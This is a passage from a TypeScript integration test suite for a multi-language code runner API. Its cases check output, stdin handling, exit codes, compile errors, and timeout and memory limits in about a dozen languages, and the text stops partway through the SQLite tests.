#!/usr/bin/env bun
/**
 * Integration test suite for the ToolMonk code runner.
 *
 * Calls the runner's REST API directly (not the Next.js SSE route).
 * Requires the runner container to be running.
 *
 * Usage:
 *   bun run test:runner                          # default http://localhost:2000
 *   RUNNER_URL=http://localhost:2000 bun run test:runner
 *   bun __tests__/integration/runner.ts --lang python   # single language
 *   bun __tests__/integration/runner.ts --filter stdin  # filter by name
 */

const RUNNER_URL = process.env.RUNNER_URL ?? "http://localhost:2000";
const EXECUTE_URL = `${RUNNER_URL}/api/v2/execute`;
const TIMEOUT_MS = 30_000; // per-request timeout

// ── ANSI helpers ──────────────────────────────────────────────────────────────

const c = {
  reset:  "\x1b[0m",
  bold:   "\x1b[1m",
  dim:    "\x1b[2m",
  red:    "\x1b[31m",
  green:  "\x1b[32m",
  yellow: "\x1b[33m",
  cyan:   "\x1b[36m",
  white:  "\x1b[37m",
  gray:   "\x1b[90m",
};

const pass  = `${c.green}✓${c.reset}`;
const fail  = `${c.red}✗${c.reset}`;
const skip  = `${c.yellow}○${c.reset}`;

// ── Runner API types ──────────────────────────────────────────────────────────

interface RunResult {
  stdout:  string;
  stderr:  string;
  code:    number | null;
  signal:  string | null;
  output:  string;
}

interface CompileResult extends RunResult {}

interface ExecuteResponse {
  language: string;
  version:  string;
  compile?: CompileResult;
  run:      RunResult;
}

// ── Test types ────────────────────────────────────────────────────────────────

interface Assertion {
  /** run.stdout must contain this string (case-sensitive) */
  stdoutContains?: string;
  /** run.stdout must equal this string exactly (trimmed) */
  stdoutExact?: string;
  /** run.stderr must contain this string */
  stderrContains?: string;
  /** run.code must equal this value */
  exitCode?: number | null;
  /** compile step must fail (compile.code !== 0) */
  compileError?: true;
  /** run.signal must be non-null (killed) */
  killed?: true;
  /** run.code must be non-zero OR signal non-null */
  failure?: true;
  /** response status code from the runner HTTP API */
  httpStatus?: number;
  /**
   * (stdout + stderr).toLowerCase() must NOT contain this string.
   * Used for security tests: asserts sensitive data did not leak even if the
   * process exited cleanly (e.g. a sandbox escape that returns 0).
   * Can be combined with failure/killed for belt-and-suspenders checks.
   */
  secureNotContains?: string;
}

interface TestCase {
  name:     string;
  lang:     string;
  code:     string;
  stdin?:   string;
  assert:   Assertion;
  /** Skip this test (won't count as failure) */
  skip?:    true;
}

// ── Shared code templates ─────────────────────────────────────────────────────

const LARGE_OUTPUT_PYTHON = `
for i in range(200000):
    print(f"line {i}")
`.trim();

const LARGE_OUTPUT_JS = `
for (let i = 0; i < 200000; i++) {
  console.log("line " + i);
}
`.trim();

// ── Test cases ────────────────────────────────────────────────────────────────

const TESTS: TestCase[] = [

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // PYTHON
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "python / hello world",
    lang: "python",
    code: `print("Hello, World!")`,
    assert: { stdoutContains: "Hello, World!", exitCode: 0 },
  },
  {
    name: "python / arithmetic",
    lang: "python",
    code: `print(2 ** 10)`,
    assert: { stdoutExact: "1024", exitCode: 0 },
  },
  {
    name: "python / multi-line output",
    lang: "python",
    code: `for i in range(5):\n    print(i)`,
    assert: { stdoutContains: "0\n1\n2\n3\n4", exitCode: 0 },
  },
  {
    name: "python / stdin",
    lang: "python",
    code: `name = input()\nprint(f"Hello, {name}")`,
    stdin: "Alice",
    assert: { stdoutContains: "Hello, Alice", exitCode: 0 },
  },
  {
    name: "python / multiple stdin lines",
    lang: "python",
    code: `a = int(input())\nb = int(input())\nprint(a + b)`,
    stdin: "7\n13",
    assert: { stdoutExact: "20", exitCode: 0 },
  },
  {
    name: "python / f-string",
    lang: "python",
    code: `x = 42\nprint(f"Answer is {x}")`,
    assert: { stdoutContains: "Answer is 42", exitCode: 0 },
  },
  {
    name: "python / list comprehension",
    lang: "python",
    code: `result = [x*x for x in range(5)]\nprint(result)`,
    assert: { stdoutContains: "[0, 1, 4, 9, 16]", exitCode: 0 },
  },
  {
    name: "python / stdlib import (math)",
    lang: "python",
    code: `import math\nprint(round(math.pi, 4))`,
    assert: { stdoutExact: "3.1416", exitCode: 0 },
  },
  {
    name: "python / stdlib import (json)",
    lang: "python",
    code: `import json\nprint(json.dumps({"a": 1}))`,
    assert: { stdoutContains: '"a": 1', exitCode: 0 },
  },
  {
    name: "python / stderr output",
    lang: "python",
    code: `import sys\nsys.stderr.write("error line\\n")\nprint("stdout line")`,
    assert: { stdoutContains: "stdout line", stderrContains: "error line", exitCode: 0 },
  },
  {
    name: "python / undefined variable (NameError)",
    lang: "python",
    code: `print(undefined_variable)`,
    assert: { stderrContains: "NameError", exitCode: 1 },
  },
  {
    name: "python / division by zero",
    lang: "python",
    code: `print(1 / 0)`,
    assert: { stderrContains: "ZeroDivisionError", exitCode: 1 },
  },
  {
    name: "python / index out of range",
    lang: "python",
    code: `a = [1, 2, 3]\nprint(a[10])`,
    assert: { stderrContains: "IndexError", exitCode: 1 },
  },
  {
    name: "python / custom exit code",
    lang: "python",
    code: `import sys\nsys.exit(42)`,
    assert: { exitCode: 42 },
  },
  {
    name: "python / syntax error",
    lang: "python",
    code: `def foo(\n    print("x")`,
    assert: { failure: true },
  },
  {
    name: "python / partial output before error",
    lang: "python",
    code: `print("first")\nraise ValueError("boom")`,
    assert: { stdoutContains: "first", stderrContains: "ValueError", exitCode: 1 },
  },
  {
    name: "python / unicode output",
    lang: "python",
    code: `print("你好 🌍 مرحبا")`,
    assert: { stdoutContains: "你好", exitCode: 0 },
  },
  {
    name: "python / large output truncated",
    lang: "python",
    code: LARGE_OUTPUT_PYTHON,
    // When fsize limit (64 KB) is hit Python gets SIGXFSZ and exits non-zero.
    // The server appends the truncation marker to the captured output.
    assert: { stdoutContains: "truncated" },
  },
  {
    name: "python / infinite loop timeout",
    lang: "python",
    code: `while True:\n    pass`,
    assert: { killed: true },
  },
  {
    name: "python / memory bomb (large list)",
    lang: "python",
    code: `x = [0] * (10 ** 9)\nprint(len(x))`,
    // Python raises MemoryError (handled internally) and exits with code 1 —
    // not a raw signal kill. Assert failure (non-zero exit), not killed.
    assert: { stderrContains: "MemoryError", failure: true },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // JAVASCRIPT
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "javascript / hello world",
    lang: "javascript",
    code: `console.log("Hello, World!")`,
    assert: { stdoutContains: "Hello, World!", exitCode: 0 },
  },
  {
    name: "javascript / arithmetic",
    lang: "javascript",
    code: `console.log(2 ** 10)`,
    assert: { stdoutExact: "1024", exitCode: 0 },
  },
  {
    name: "javascript / multi-line output",
    lang: "javascript",
    code: `for (let i = 0; i < 5; i++) console.log(i);`,
    assert: { stdoutContains: "0\n1\n2\n3\n4", exitCode: 0 },
  },
  {
    name: "javascript / stdin",
    lang: "javascript",
    code: `const lines = [];\nprocess.stdin.setEncoding('utf8');\nprocess.stdin.on('data', d => lines.push(d.trim()));\nprocess.stdin.on('end', () => console.log("Hello, " + lines[0]));`,
    stdin: "Bob",
    assert: { stdoutContains: "Hello, Bob", exitCode: 0 },
  },
  {
    name: "javascript / template literals",
    lang: "javascript",
    code: `const x = 42;\nconsole.log(\`Answer: \${x}\`);`,
    assert: { stdoutContains: "Answer: 42", exitCode: 0 },
  },
  {
    name: "javascript / array methods",
    lang: "javascript",
    code: `console.log([1,2,3,4,5].filter(x => x % 2 === 0).join(","))`,
    assert: { stdoutExact: "2,4", exitCode: 0 },
  },
  {
    name: "javascript / console.error goes to stderr",
    lang: "javascript",
    code: `console.error("err msg");\nconsole.log("ok");`,
    assert: { stdoutContains: "ok", stderrContains: "err msg", exitCode: 0 },
  },
  {
    name: "javascript / async/await",
    lang: "javascript",
    code: `(async () => {\n  await new Promise(r => setTimeout(r, 10));\n  console.log("async done");\n})();`,
    assert: { stdoutContains: "async done", exitCode: 0 },
  },
  {
    name: "javascript / undefined property (TypeError)",
    lang: "javascript",
    code: `const x = null;\nconsole.log(x.y);`,
    assert: { stderrContains: "TypeError", failure: true },
  },
  {
    name: "javascript / throw Error",
    lang: "javascript",
    code: `throw new Error("intentional failure")`,
    assert: { stderrContains: "intentional failure", failure: true },
  },
  {
    name: "javascript / process.exit code",
    lang: "javascript",
    code: `process.exit(5)`,
    assert: { exitCode: 5 },
  },
  {
    name: "javascript / require os (builtin module)",
    lang: "javascript",
    code: `const os = require('os');\nconsole.log(typeof os.platform());`,
    assert: { stdoutExact: "string", exitCode: 0 },
  },
  {
    name: "javascript / large output truncated",
    lang: "javascript",
    code: LARGE_OUTPUT_JS,
    assert: { stdoutContains: "truncated" },
  },
  {
    name: "javascript / infinite loop timeout",
    lang: "javascript",
    code: `while (true) {}`,
    assert: { killed: true },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // TYPESCRIPT
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "typescript / hello world",
    lang: "typescript",
    code: `const msg: string = "Hello, World!";\nconsole.log(msg);`,
    assert: { stdoutContains: "Hello, World!", exitCode: 0 },
  },
  {
    name: "typescript / interface + function",
    lang: "typescript",
    code: `interface Point { x: number; y: number; }\nfunction dist(p: Point): number { return Math.sqrt(p.x**2 + p.y**2); }\nconsole.log(dist({x:3, y:4}));`,
    assert: { stdoutExact: "5", exitCode: 0 },
  },
  {
    name: "typescript / generics",
    lang: "typescript",
    code: `function identity<T>(val: T): T { return val; }\nconsole.log(identity<string>("works"));`,
    assert: { stdoutExact: "works", exitCode: 0 },
  },
  {
    name: "typescript / enum",
    lang: "typescript",
    code: `enum Color { Red = "RED", Green = "GREEN" }\nconsole.log(Color.Green);`,
    assert: { stdoutExact: "GREEN", exitCode: 0 },
  },
  {
    name: "typescript / type error (compile error)",
    lang: "typescript",
    code: `const x: number = "not a number";`,
    assert: { compileError: true },
  },
  {
    name: "typescript / missing property (compile error)",
    lang: "typescript",
    code: `interface Foo { bar: string; }\nconst f: Foo = {};`,
    assert: { compileError: true },
  },
  {
    name: "typescript / runtime throw",
    lang: "typescript",
    code: `function fail(): never { throw new Error("ts fail"); }\nfail();`,
    assert: { stderrContains: "ts fail", failure: true },
  },
  {
    name: "typescript / stdin (readline)",
    lang: "typescript",
    // Uses import syntax — tsc --noEmit resolves readline via _node_shims.d.ts;
    // ts-node --transpile-only executes it with proper piped-stdin support.
    code: `import * as readline from "readline";\nconst rl = readline.createInterface({ input: process.stdin });\nrl.on("line", (line: string) => {\n  console.log("got: " + line.trim());\n  rl.close();\n});`,
    stdin: "hello ts",
    assert: { stdoutContains: "got: hello ts", exitCode: 0 },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // JAVA
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "java / hello world",
    lang: "java",
    code: `public class Main {\n  public static void main(String[] args) {\n    System.out.println("Hello, World!");\n  }\n}`,
    assert: { stdoutContains: "Hello, World!", exitCode: 0 },
  },
  {
    name: "java / arithmetic",
    lang: "java",
    code: `public class Main {\n  public static void main(String[] args) {\n    System.out.println((int)Math.pow(2, 10));\n  }\n}`,
    assert: { stdoutExact: "1024", exitCode: 0 },
  },
  {
    name: "java / stdin with Scanner",
    lang: "java",
    code: `import java.util.Scanner;\npublic class Main {\n  public static void main(String[] args) {\n    Scanner sc = new Scanner(System.in);\n    String name = sc.nextLine();\n    System.out.println("Hello, " + name);\n  }\n}`,
    stdin: "Carol",
    assert: { stdoutContains: "Hello, Carol", exitCode: 0 },
  },
  {
    name: "java / multi-line stdin",
    lang: "java",
    code: `import java.util.Scanner;\npublic class Main {\n  public static void main(String[] args) {\n    Scanner sc = new Scanner(System.in);\n    int a = sc.nextInt(), b = sc.nextInt();\n    System.out.println(a + b);\n  }\n}`,
    stdin: "12\n30",
    assert: { stdoutExact: "42", exitCode: 0 },
  },
  {
    name: "java / custom class name detection",
    lang: "java",
    code: `public class Solution {\n  public static void main(String[] args) {\n    System.out.println("Solution class");\n  }\n}`,
    assert: { stdoutContains: "Solution class", exitCode: 0 },
  },
  {
    name: "java / exception thrown",
    lang: "java",
    code: `public class Main {\n  public static void main(String[] args) {\n    throw new RuntimeException("java error");\n  }\n}`,
    assert: { stderrContains: "java error", failure: true },
  },
  {
    name: "java / ArrayIndexOutOfBounds",
    lang: "java",
    code: `public class Main {\n  public static void main(String[] args) {\n    int[] a = {1,2,3};\n    System.out.println(a[10]);\n  }\n}`,
    assert: { stderrContains: "ArrayIndexOutOfBoundsException", failure: true },
  },
  {
    name: "java / NullPointerException",
    lang: "java",
    code: `public class Main {\n  public static void main(String[] args) {\n    String s = null;\n    System.out.println(s.length());\n  }\n}`,
    assert: { stderrContains: "NullPointerException", failure: true },
  },
  {
    name: "java / compile error (missing semicolon)",
    lang: "java",
    code: `public class Main {\n  public static void main(String[] args) {\n    System.out.println("no semicolon")\n  }\n}`,
    assert: { compileError: true },
  },
  {
    name: "java / compile error (missing class brace)",
    lang: "java",
    code: `public class Main {\n  public static void main(String[] args) {\n    System.out.println("ok");\n  }\n`,
    assert: { compileError: true },
  },
  {
    name: "java / System.exit code",
    lang: "java",
    code: `public class Main {\n  public static void main(String[] args) {\n    System.exit(7);\n  }\n}`,
    assert: { exitCode: 7 },
  },
  {
    name: "java / ArrayList and generics",
    lang: "java",
    code: `import java.util.ArrayList;\npublic class Main {\n  public static void main(String[] args) {\n    ArrayList<Integer> list = new ArrayList<>();\n    for (int i=1;i<=5;i++) list.add(i*i);\n    System.out.println(list);\n  }\n}`,
    assert: { stdoutContains: "[1, 4, 9, 16, 25]", exitCode: 0 },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // C
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "c / hello world",
    lang: "c",
    code: `#include <stdio.h>\nint main() { printf("Hello, World!\\n"); return 0; }`,
    assert: { stdoutContains: "Hello, World!", exitCode: 0 },
  },
  {
    name: "c / arithmetic",
    lang: "c",
    code: `#include <stdio.h>\nint main() { printf("%d\\n", 1 << 10); return 0; }`,
    assert: { stdoutExact: "1024", exitCode: 0 },
  },
  {
    name: "c / scanf stdin",
    lang: "c",
    code: `#include <stdio.h>\nint main() { char name[64]; scanf("%s", name); printf("Hello, %s\\n", name); return 0; }`,
    stdin: "Dave",
    assert: { stdoutContains: "Hello, Dave", exitCode: 0 },
  },
  {
    name: "c / two integers from stdin",
    lang: "c",
    code: `#include <stdio.h>\nint main() { int a, b; scanf("%d %d", &a, &b); printf("%d\\n", a+b); return 0; }`,
    stdin: "15 27",
    assert: { stdoutExact: "42", exitCode: 0 },
  },
  {
    name: "c / return non-zero exit",
    lang: "c",
    code: `int main() { return 3; }`,
    assert: { exitCode: 3 },
  },
  {
    name: "c / compile error (undeclared variable)",
    lang: "c",
    code: `#include <stdio.h>\nint main() { printf("%d\\n", x); return 0; }`,
    assert: { compileError: true },
  },
  {
    name: "c / compile error (syntax error)",
    lang: "c",
    code: `#include <stdio.h>\nint main() { printf("hello" return 0; }`,
    assert: { compileError: true },
  },
  {
    name: "c / math library",
    lang: "c",
    code: `#include <stdio.h>\n#include <math.h>\nint main() { printf("%.0f\\n", sqrt(144)); return 0; }`,
    assert: { stdoutExact: "12", exitCode: 0 },
  },
  {
    name: "c / array and loop",
    lang: "c",
    code: `#include <stdio.h>\nint main() { int a[]={1,2,3,4,5}; int s=0; for(int i=0;i<5;i++) s+=a[i]; printf("%d\\n",s); return 0; }`,
    assert: { stdoutExact: "15", exitCode: 0 },
  },
  {
    name: "c / division by zero (SIGFPE signal)",
    lang: "c",
    code: `#include <stdio.h>\nint main() { int x=1,y=0; printf("%d\\n", x/y); return 0; }`,
    assert: { killed: true },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // C++
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "c++ / hello world",
    lang: "c++",
    code: `#include <iostream>\nint main() { std::cout << "Hello, World!" << std::endl; return 0; }`,
    assert: { stdoutContains: "Hello, World!", exitCode: 0 },
  },
  {
    name: "c++ / cin stdin",
    lang: "c++",
    code: `#include <iostream>\n#include <string>\nint main() { std::string name; std::cin >> name; std::cout << "Hello, " << name << std::endl; return 0; }`,
    stdin: "Eve",
    assert: { stdoutContains: "Hello, Eve", exitCode: 0 },
  },
  {
    name: "c++ / STL vector",
    lang: "c++",
    code: `#include <iostream>\n#include <vector>\n#include <numeric>\nint main() { std::vector<int> v={1,2,3,4,5}; std::cout << std::accumulate(v.begin(),v.end(),0) << std::endl; return 0; }`,
    assert: { stdoutExact: "15", exitCode: 0 },
  },
  {
    name: "c++ / template function",
    lang: "c++",
    code: `#include <iostream>\ntemplate<typename T> T square(T x){return x*x;}\nint main(){std::cout << square(9) << std::endl; return 0;}`,
    assert: { stdoutExact: "81", exitCode: 0 },
  },
  {
    name: "c++ / string operations",
    lang: "c++",
    code: `#include <iostream>\n#include <string>\nint main() { std::string s="hello"; s[0]='H'; std::cout << s << std::endl; return 0; }`,
    assert: { stdoutExact: "Hello", exitCode: 0 },
  },
  {
    name: "c++ / compile error (missing namespace)",
    lang: "c++",
    code: `int main() { cout << "hello" << endl; return 0; }`,
    assert: { compileError: true },
  },
  {
    name: "c++ / exception throw/catch",
    lang: "c++",
    code: `#include <iostream>\n#include <stdexcept>\nint main() { try { throw std::runtime_error("caught"); } catch(const std::exception& e) { std::cout << e.what() << std::endl; } return 0; }`,
    assert: { stdoutExact: "caught", exitCode: 0 },
  },
  {
    name: "c++ / uncaught exception",
    lang: "c++",
    code: `#include <stdexcept>\nint main() { throw std::runtime_error("uncaught"); return 0; }`,
    assert: { failure: true },
  },
  {
    name: "c++ / out-of-range vector access (terminate)",
    lang: "c++",
    code: `#include <vector>\nint main() { std::vector<int> v={1,2,3}; return v.at(99); }`,
    assert: { failure: true },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // GO
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "go / hello world",
    lang: "go",
    code: `package main\nimport "fmt"\nfunc main() { fmt.Println("Hello, World!") }`,
    assert: { stdoutContains: "Hello, World!", exitCode: 0 },
  },
  {
    name: "go / arithmetic",
    lang: "go",
    code: `package main\nimport "fmt"\nfunc main() { fmt.Println(1 << 10) }`,
    assert: { stdoutExact: "1024", exitCode: 0 },
  },
  {
    name: "go / stdin with bufio",
    lang: "go",
    code: `package main\nimport ("bufio";"fmt";"os")\nfunc main() { scanner := bufio.NewScanner(os.Stdin); scanner.Scan(); fmt.Println("Hello, " + scanner.Text()) }`,
    stdin: "Frank",
    assert: { stdoutContains: "Hello, Frank", exitCode: 0 },
  },
  {
    name: "go / two ints from stdin",
    lang: "go",
    code: `package main\nimport "fmt"\nfunc main() { var a, b int; fmt.Scan(&a, &b); fmt.Println(a+b) }`,
    stdin: "19 23",
    assert: { stdoutExact: "42", exitCode: 0 },
  },
  {
    name: "go / slices and range",
    lang: "go",
    code: `package main\nimport "fmt"\nfunc main() { s:=[]int{1,2,3,4,5}; sum:=0; for _,v:=range s{sum+=v}; fmt.Println(sum) }`,
    assert: { stdoutExact: "15", exitCode: 0 },
  },
  {
    name: "go / map usage",
    lang: "go",
    code: `package main\nimport "fmt"\nfunc main() { m:=map[string]int{"a":1,"b":2}; fmt.Println(m["a"]+m["b"]) }`,
    assert: { stdoutExact: "3", exitCode: 0 },
  },
  {
    name: "go / compile error (unused variable)",
    lang: "go",
    code: `package main\nfunc main() { x := 5 }`,
    assert: { compileError: true },
  },
  {
    name: "go / compile error (unused import)",
    lang: "go",
    code: `package main\nimport "os"\nfunc main() {}`,
    assert: { compileError: true },
  },
  {
    name: "go / panic (index out of range)",
    lang: "go",
    code: `package main\nfunc main() { a:=[]int{1,2,3}; _ = a[10] }`,
    assert: { stderrContains: "panic", failure: true },
  },
  {
    name: "go / os.Exit code",
    lang: "go",
    code: `package main\nimport "os"\nfunc main() { os.Exit(9) }`,
    assert: { exitCode: 9 },
  },
  {
    name: "go / string formatting",
    lang: "go",
    code: `package main\nimport "fmt"\nfunc main() { fmt.Printf("%.4f\\n", 3.14159265) }`,
    assert: { stdoutExact: "3.1416", exitCode: 0 },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // BASH
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "bash / hello world",
    lang: "bash",
    code: `echo "Hello, World!"`,
    assert: { stdoutContains: "Hello, World!", exitCode: 0 },
  },
  {
    name: "bash / read stdin",
    lang: "bash",
    code: `read name\necho "Hello, $name"`,
    stdin: "Grace",
    assert: { stdoutContains: "Hello, Grace", exitCode: 0 },
  },
  {
    name: "bash / arithmetic",
    lang: "bash",
    code: `echo $((2 ** 10))`,
    assert: { stdoutExact: "1024", exitCode: 0 },
  },
  {
    name: "bash / for loop",
    lang: "bash",
    code: `for i in 1 2 3 4 5; do echo $i; done`,
    assert: { stdoutContains: "1\n2\n3\n4\n5", exitCode: 0 },
  },
  {
    name: "bash / array",
    lang: "bash",
    code: `arr=(10 20 30)\necho \${arr[1]}`,
    assert: { stdoutExact: "20", exitCode: 0 },
  },
  {
    name: "bash / string manipulation",
    lang: "bash",
    code: `s="hello world"\necho \${s^^}`,
    assert: { stdoutExact: "HELLO WORLD", exitCode: 0 },
  },
  {
    name: "bash / pipeline",
    lang: "bash",
    code: `echo -e "b\\na\\nc" | sort`,
    assert: { stdoutContains: "a\nb\nc", exitCode: 0 },
  },
  {
    name: "bash / exit code",
    lang: "bash",
    code: `exit 2`,
    assert: { exitCode: 2 },
  },
  {
    name: "bash / stderr output",
    lang: "bash",
    code: `echo "stdout msg"\necho "stderr msg" >&2`,
    assert: { stdoutContains: "stdout msg", stderrContains: "stderr msg", exitCode: 0 },
  },
  {
    name: "bash / if condition",
    lang: "bash",
    code: `x=10\nif [ $x -gt 5 ]; then echo "big"; else echo "small"; fi`,
    assert: { stdoutExact: "big", exitCode: 0 },
  },
  {
    name: "bash / undefined variable (non-zero)",
    lang: "bash",
    code: `#!/bin/bash\nset -u\necho $UNDEFINED_VAR`,
    assert: { failure: true },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // RUBY
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "ruby / hello world",
    lang: "ruby",
    code: `puts "Hello, World!"`,
    assert: { stdoutContains: "Hello, World!", exitCode: 0 },
  },
  {
    name: "ruby / arithmetic",
    lang: "ruby",
    code: `puts 2 ** 10`,
    assert: { stdoutExact: "1024", exitCode: 0 },
  },
  {
    name: "ruby / stdin",
    lang: "ruby",
    code: `name = gets.chomp\nputs "Hello, #{name}"`,
    stdin: "Heidi",
    assert: { stdoutContains: "Hello, Heidi", exitCode: 0 },
  },
  {
    name: "ruby / multi-line stdin",
    lang: "ruby",
    code: `a = gets.to_i\nb = gets.to_i\nputs a + b`,
    stdin: "15\n27",
    assert: { stdoutExact: "42", exitCode: 0 },
  },
  {
    name: "ruby / array map",
    lang: "ruby",
    code: `puts [1,2,3,4,5].map { |x| x * x }.inspect`,
    assert: { stdoutContains: "[1, 4, 9, 16, 25]", exitCode: 0 },
  },
  {
    name: "ruby / hash",
    lang: "ruby",
    code: `h = {a: 1, b: 2, c: 3}\nputs h.values.sum`,
    assert: { stdoutExact: "6", exitCode: 0 },
  },
  {
    name: "ruby / string interpolation",
    lang: "ruby",
    code: `x = 42\nputs "The answer is #{x}"`,
    assert: { stdoutContains: "The answer is 42", exitCode: 0 },
  },
  {
    name: "ruby / exception raise/rescue",
    lang: "ruby",
    code: `begin\n  raise "rescued!"\nrescue => e\n  puts e.message\nend`,
    assert: { stdoutExact: "rescued!", exitCode: 0 },
  },
  {
    name: "ruby / unhandled exception",
    lang: "ruby",
    code: `raise RuntimeError, "ruby error"`,
    assert: { stderrContains: "ruby error", failure: true },
  },
  {
    name: "ruby / undefined method",
    lang: "ruby",
    code: `puts undefined_method_call()`,
    assert: { stderrContains: "NoMethodError", failure: true },
  },
  {
    name: "ruby / exit code",
    lang: "ruby",
    code: `exit 4`,
    assert: { exitCode: 4 },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // PHP
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "php / hello world",
    lang: "php",
    code: `<?php\necho "Hello, World!\\n";`,
    assert: { stdoutContains: "Hello, World!", exitCode: 0 },
  },
  {
    name: "php / arithmetic",
    lang: "php",
    code: `<?php\necho pow(2, 10) . "\\n";`,
    assert: { stdoutExact: "1024", exitCode: 0 },
  },
  {
    name: "php / stdin with fgets",
    lang: "php",
    code: `<?php\n$name = trim(fgets(STDIN));\necho "Hello, $name\\n";`,
    stdin: "Ivan",
    assert: { stdoutContains: "Hello, Ivan", exitCode: 0 },
  },
  {
    name: "php / two ints from stdin",
    lang: "php",
    code: `<?php\n$a = (int)fgets(STDIN);\n$b = (int)fgets(STDIN);\necho ($a + $b) . "\\n";`,
    stdin: "18\n24",
    assert: { stdoutExact: "42", exitCode: 0 },
  },
  {
    name: "php / array functions",
    lang: "php",
    code: `<?php\n$arr = [3,1,4,1,5,9,2,6];\nsort($arr);\necho implode(",", $arr) . "\\n";`,
    assert: { stdoutContains: "1,1,2,3,4,5,6,9", exitCode: 0 },
  },
  {
    name: "php / string functions",
    lang: "php",
    code: `<?php\necho strtoupper("hello world") . "\\n";`,
    assert: { stdoutExact: "HELLO WORLD", exitCode: 0 },
  },
  {
    name: "php / exception throw/catch",
    lang: "php",
    code: `<?php\ntry { throw new Exception("caught"); } catch (Exception $e) { echo $e->getMessage() . "\\n"; }`,
    assert: { stdoutExact: "caught", exitCode: 0 },
  },
  {
    name: "php / fatal error (call undefined function)",
    lang: "php",
    code: `<?php\nundefined_function_xyz();`,
    assert: { failure: true },
  },
  {
    name: "php / exit code",
    lang: "php",
    code: `<?php\nexit(6);`,
    assert: { exitCode: 6 },
  },
  {
    name: "php / heredoc string",
    lang: "php",
    code: `<?php\n$s = <<<EOT\nHello PHP\nEOT;\necho $s . "\\n";`,
    assert: { stdoutContains: "Hello PHP", exitCode: 0 },
  },

  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  // SQLITE
  // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  {
    name: "sqlite / simple select",
    lang: "sqlite3",
    code: `SELECT 'Hello, World!';`,
    assert: { stdoutContains: "Hello, World!", exitCode: 0 },
  },
  {
    name: "sqlite / arithmetic",
    lang: "sqlite3",
    code: `SELECT 2 * 21;`,
    assert: { stdoutExact: "42", exitCode: 0 },
  },
  {
    name: "sqlite / create table + insert + select",
    lang: "sqlite3",
    code: `CREATE TABLE nums (n INTEGER);\nINSERT INTO nums VALUES (10),(20),(30);\nSELECT SUM(n) FROM nums;`,
    assert: { stdoutExact: "60", exitCode: 0 },
  },
  {
    name: "sqlite / aggregate functions",
    lang: "sqlite3",
    code: `CREATE TABLE scores (s REAL);\nINSERT INTO scores VALUES (80),(90),(70),(100);\nSELECT MIN(s), MAX(s), AVG(s) FROM scores;`,
    assert: { stdoutContains: "70", exitCode: 0 },
  },
  {
    name: "sqlite / JOIN",
    lang: "sqlite3",
    code: `CREATE TABLE a (id INT, name TEXT);\nCREATE TABLE b (id INT, val INT);\nINSERT INTO a VALUES (1,'Alice'),(2,'Bob');\nINSERT INTO b VALUES (1,100),(2,200);\nSELECT a.name, b.val FROM a JOIN b ON a.id=b.id ORDER BY a.id;`,
    assert: { stdoutContains: "Alice|100", exitCode: 0 },
  },
  {
    name: "sqlite / subquery",
    lang: "sqlite3",
    code: `CREATE TABLE vals (v INT);\nINSERT INTO vals VALUES (1),(2),(3),(4),(5);\nSELECT COUNT(*) FROM vals WHERE v > (SELECT AVG(v) FROM vals);`,
